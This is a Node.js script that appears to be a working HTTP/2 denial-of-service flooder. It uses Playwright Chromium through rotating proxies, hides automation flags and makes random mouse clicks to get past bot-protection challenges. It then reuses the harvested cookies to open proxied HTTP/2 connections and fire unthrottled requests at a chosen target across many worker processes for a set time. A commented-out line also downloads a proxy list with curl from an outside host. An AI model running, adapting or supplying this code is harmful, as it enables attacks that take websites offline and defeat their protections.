const {
  chromium
} = require('playwright-extra');
const {spawn} = require('child_process');
const os = require('os');
const dns = require('dns');
const net = require('net');
const tls = require('tls');
const http2 = require('http2');
const cluster = require('cluster');
var request = require('request');
const fsPromises = require('fs/promises');
require('events').EventEmitter.defaultMaxListeners = 0;
const fs = require('fs');
const {
  PassThrough
} = require('stream');
const JSStreamSocket = new tls.TLSSocket(new PassThrough())._handle._parentWrap.constructor;
const { exec } = require("child_process");
const path = require('path');
//exec('curl -O https://sheesh.rip/http.txt --user-agent "hello bnt"')
if (process.argv.length < 6) {
    console.log('URL Time Threads Proxies');
    console.log('https://sheesh.rip/ 120 5 http.txt optional(<debug>)');
    process.exit(0);
}

function h2(target, cookie, userAgent, proxy) {
  console.log(proxy)
  const parts = proxy.split(':');
  const url = new URL(target);
  if (cookie.length == 0) {
    cookie = 'v=1';
  }
  let ip = null;
  if (target.indexOf(".onion") != -1) {
    ip = url.hostname;
  } else {
    setInterval(() => {
      dns.lookup(url.hostname, 4, (err, address, family) => {
        ip = address;
      });
    });
  }
  let stats = {};
  setInterval(() => {
    process.send(stats);
    stats = {};
  });
  const intvl = setInterval(() => {
    if (ip == null) return;
    const options = {
      proxy: {
        host: parts[0],
        port: Number(parts[1]),
      },

      command: 'connect',

      destination: {
        host: ip,
        port: url.port == '' ? url.protocol == 'https:' ? 443 : 80 : Number(url.port)
      }
    };
    function connected(info) {
      function sendRequest(socket) {
        http2.connect(`http://${url.host}${url.pathname}`, {
          createConnection: () => socket,
          settings: {
            headerTableSize: 65536,
            maxConcurrentStreams: 1000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
          }
        }, session => {
          session.on('error', () => {});
          function doReq() {
            const requestHeaders = Object.assign({
              ':authority': url.host,
              ':method': 'GET',
              ':path': url.pathname,
              ':scheme': url.protocol.substring(0, url.protocol.length - 1)
            }, {
              'user-agent': userAgent,
              'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
              'accept-language': 'en-US,en;q=0.9',
              'accept-encoding': 'gzip, deflate, br',
              'x-requested-with': 'XMLHttpRequest',
              'cookie': cookie,
              'cache-control': 'no-cache',
              'Upgrade-Insecure-Requests': '1'
            });
            try {
              const request = session.request(requestHeaders);
              request.on('error', () => {}).end().on('response', response => {
                if (stats[response[':status']] == null) stats[response[':status']] = 0;
                stats[response[':status']]++;
              });
            } catch {}
          }
          doReq();
        }).on('error', () => {});
      }
      if (url.protocol == 'https:') {
        const socket = tls.connect({
          rejectUnauthorized: false,
          servername: url.hostname,
          socket: new JSStreamSocket(info.socket),
          secure: true,
          ALPNProtocols: ['h2', 'http1.1']
        }, () => {
          sendRequest(socket);
        }).on('error', () => {});
      } else {
        sendRequest(info.socket);
      }
    }
    const socket = net.connect(options.proxy.port, options.proxy.host, () => {
      socket.once('data', () => connected({
        socket
      }));
      socket.write(Buffer.from(`CONNECT ${options.destination.host}:${options.destination.port} HTTP/1.1\r\nProxy-Connection: keep-alive\r\nHost: ${options.destination.host}\r\n\r\n`, 'binary'));
    }).on('error', () => {});
  });
}

const target = process.argv[2], time = process.argv[3],thread = process.argv[4], proxy = process.argv[5];
//process.on('uncaughtException', function (err) {});
setTimeout(() => {
  process.exit()
}, time*1000);
proxies = fs.readFileSync(proxy, 'utf-8').toString().replace(/\r/g, '').split('\n').filter(word => word.trim().length > 0);
        
if (cluster.isPrimary) {
  for (let i = 0; i < thread; i++) cluster.fork();
  setTimeout(() => process.exit(0), Number(time) * 1000);
} else {
async function run() {
const proxer = proxies[~~(Math.random() * (proxies.length - 1))];
const tmpD = await fsPromises.mkdtemp(path.join(os.tmpdir(), 'profile-'));
chromium.launch({
      ignoreDefaultArgs: true,
      timeout: 60000,
      headless: false,
      args: [`--proxy-server=${proxer}`, '--no-first-run', '--no-service-autorun', '--use-gl=swiftshader', '--use-angle=angle', '--no-sandbox', '--disable-setuid-sandbox', '--disable-gpu', `--user-data-dir=${tmpD}`, '--disable-shared-workers', '--remote-debugging-pipe']
    }).then(async browser => {
  try {
  const context = await browser.newContext({
          serviceWorkers: 'block',
          timeout: 60000
        });
  context.setDefaultTimeout(60000)
  context.setDefaultNavigationTimeout(30000)
  await context.addInitScript(() => Object.defineProperty(navigator, 'webdriver', {
          get: () => false
        }));
  const page = await context.newPage()
  await page.setViewportSize({width: 1920, height: 1080});
  const getUA = await page.evaluate(() => navigator.userAgent);
  if(process.argv[6] == 'debug') {
    console.log('Browser! Proxy: '+proxer + ' | UserAgent: '+getUA);
  }
  await page.goto(target, { waitUntil: 'networkidle' })
  await page.mouse.move(Math.floor(Math.random() * 100) + 1, Math.floor(Math.random() * 100) + 1);
  await page.mouse.click(Math.floor(Math.random() * 100) + 1, Math.floor(Math.random() * 100) + 1);
  await page.mouse.down();
  await page.mouse.move(Math.floor(Math.random() * 100) + 1, Math.floor(Math.random() * 100) + 1);
  await page.mouse.click(Math.floor(Math.random() * 100) + 1, Math.floor(Math.random() * 100) + 1);
  await page.mouse.move(Math.floor(Math.random() * 100) + 1, Math.floor(Math.random() * 100) + 1);
  await page.mouse.click(Math.floor(Math.random() * 100) + 1, Math.floor(Math.random() * 100) + 1);
  await page.mouse.move(Math.floor(Math.random() * 100) + 1, Math.floor(Math.random() * 100) + 1);
  await page.mouse.move(Math.floor(Math.random() * 100) + 1, Math.floor(Math.random() * 100) + 1);
  await page.mouse.click(Math.floor(Math.random() * 100) + 1, Math.floor(Math.random() * 100) + 1);
  await page.mouse.up();
  await page.waitForTimeout(8000);
  const title = await page.title();
  const cookies = (await context.cookies(target)).map(c => `${c.name}=${c.value}`).join('; ');
  console.log('Solved! Proxy: '+proxer + ' | UserAgent: '+getUA + ' | Cookie: '+cookies + ' | Title: '+title); 
  h2(target, cookies, getUA, proxer, null);
  } finally {
    await browser.close();
  }
  }).catch((e) => {run();});
 }
run();
}
